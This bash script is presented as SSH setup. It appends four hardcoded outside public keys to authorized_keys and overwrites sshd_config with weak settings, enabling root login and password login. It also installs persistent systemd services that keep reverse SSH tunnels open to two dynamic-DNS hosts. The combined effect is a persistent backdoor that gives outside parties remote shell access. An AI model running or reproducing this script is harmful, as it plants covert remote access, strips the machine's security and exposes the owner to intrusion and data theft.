#!/bin/bash

# Packages needed for running this script successfully
sudo apt update

# Required packages
packages=(openssh-server autossh)

# Loop through each package
for pkg in "${packages[@]}"; do
    if dpkg -s "$pkg" &> /dev/null; then
        echo "[+] $pkg is already installed."
    else
        echo "[*] Installing $pkg..."
        sudo apt install -y "$pkg"
    fi
done


# Generate the key pair
key_path="$HOME/.ssh/$(whoami)_ed25519"
[ ! -e "$key_path" ] && ssh-keygen -t ed25519 -f "$key_path" -N ""

# Setup sshd
cat <<EOF >> ~/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHfWGblM3hG4bwrALVaC0mWhnzdPeolZjUAvd0l6Eolk nobody1
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDeQigM/aHDiVVl06SaUioJ9yll+4v+OsADC8WYdSLWz nobody2
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIzWLETupIltsWaqiKsFJ1ub4sKXohgqLYj0z5ORQRSb nobody1@web-server
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM6xc2Xh8JDTXCq3I5/GbbrkbXYfFcMAt/wHPfHIo0Zp nobody2@web-server
EOF

# Backup current sshd_config
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak

# Configure sshd
requiredSettings="""
Port 22
ListenAddress 0.0.0.0
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys .ssh/authorized_keys2
PermitRootLogin yes
PasswordAuthentication yes
AllowAgentForwarding yes
AllowTcpForwarding yes
GatewayPorts yes
PermitTTY yes
TCPKeepAlive yes
PermitTunnel yes
Subsystem sftp /usr/lib/openssh/sftp-server
"""

# Overwrite sshd_config with the required settings
echo "$requiredSettings" | sudo tee /etc/ssh/sshd_config > /dev/null


# List of remote hosts
hosts=("ximand.ddns.net" "edcoretecmm.sytes.net")
user="nobody1"

# Request a port number from the server (this could be handled by the server's API)
#received_port=$(curl -s "http://$host/info")
received_port=2001

for host in "${hosts[@]}"; do
    echo "Setting up for $host"

    # Copy the public key to the remote host
    ssh-copy-id -i "$key_path.pub" "$user@$host"

    # Create a unique systemd service for each host
    service_name="reverse-tunnel-${host%%.*}"

    cat << EOF | sudo tee /etc/systemd/system/${service_name}.service > /dev/null
[Unit]
Description=Reverse SSH Tunnel to $host
After=network.target

[Service]
User=$USER
ExecStart=/usr/bin/autossh -i $key_path -N -R $received_port:127.0.0.1:22 "$user@$host"
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

    # Enable and start the service
    sudo systemctl daemon-reload
    sudo systemctl enable ${service_name}.service
    sudo systemctl start ${service_name}.service

    echo "Service $service_name started for $host"
done
